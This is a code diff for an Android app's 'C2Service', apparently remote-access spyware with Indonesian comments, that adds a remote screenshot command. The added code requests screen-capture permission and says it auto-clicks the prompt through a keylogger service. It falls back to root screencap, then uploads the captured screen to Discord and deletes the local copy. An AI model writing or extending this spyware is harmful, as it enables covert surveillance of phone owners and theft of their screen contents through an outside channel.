@@ -306,6 +306,7 @@ class C2Service : Service() {
             "sleep" -> sleepCmd(arg)
             "exit" -> {
                 say("bye")
+                Screen.stop()
                 running = false
                 stopSelf()
             }
@@ -740,15 +741,47 @@ class C2Service : Service() {
     /**
      * Screenshot layar.
      *
-     * `screencap` butuh READ_FRAME_BUFFER, permission bertanda tangan yang
-     * cuma dipegang aplikasi sistem. Dari uid aplikasi hasilnya file kosong
-     * tanpa pesan — itu yang dulu muncul sebagai "file kosong". Dengan root
-     * jalan normal; tanpa root Android memang menolak, dan itu dilaporkan
-     * sebagai penolakan, bukan sebagai kegagalan misterius.
+     * Urutannya: MediaProjection (jalan tanpa root, sekali izin), lalu
+     * `screencap` lewat `su` kalau ada root, lalu `screencap` langsung yang
+     * biasanya ditolak OS. Pesan gagalnya menyebut mana yang dicoba, bukan
+     * "file kosong".
      */
     private fun shot() {
         val out = File(cacheDir, "shot.png")
         if (out.exists()) out.delete()
+
+        if (Screen.ready) {
+            Thread({ doShot(out) }, "shot").start()
+            return
+        }
+
+        say(
+            if (KeylogService.instance != null) "SHOT izin layar: minta + klik otomatis"
+            else "SHOT minta izin sekali: tekan \"Start now\" di layar"
+        )
+        Screen.request(this) { ok ->
+            if (ok) {
+                say("SHOT izin diterima — menangkap layar")
+                Thread({ doShot(out) }, "shot").start()
+            } else {
+                say("SHOT_GAGAL izin layar ditolak")
+            }
+        }
+    }
+
+    private fun doShot(out: File) {
+        var why = ""
+
+        if (Screen.ready) {
+            val r = Screen.capture(out)
+            if (r == "OK" && out.exists() && out.length() > 1000) {
+                val ok = Discord.upload(out, tag + "shot")
+                say(if (ok) "SHOT ${out.length()} B" else "SHOT_GAGAL upload")
+                out.delete()
+                return
+            }
+            why = r
+        }
 
         val err = StringBuilder()
         if (Actions.hasSu()) {
@@ -771,13 +804,13 @@ class C2Service : Service() {
             val ok = Discord.upload(out, tag + "shot")
             say(if (ok) "SHOT ${out.length()} B" else "SHOT_GAGAL upload")
             out.delete()
-        } else {
-            say(
-                "SHOT_GAGAL " + err.toString().ifEmpty {
-                    "screencap ditolak OS — butuh root (READ_FRAME_BUFFER hanya untuk aplikasi sistem)"
-                }
-            )
+            return
         }
+
+        val detail = err.toString().ifEmpty {
+            "screencap ditolak OS dan MediaProjection tidak memberi frame"
+        }
+        say("SHOT_GAGAL " + listOf(why, detail).filter { it.isNotBlank() }.joinToString(" | "))
     }
 
     private fun dl(path: String) {
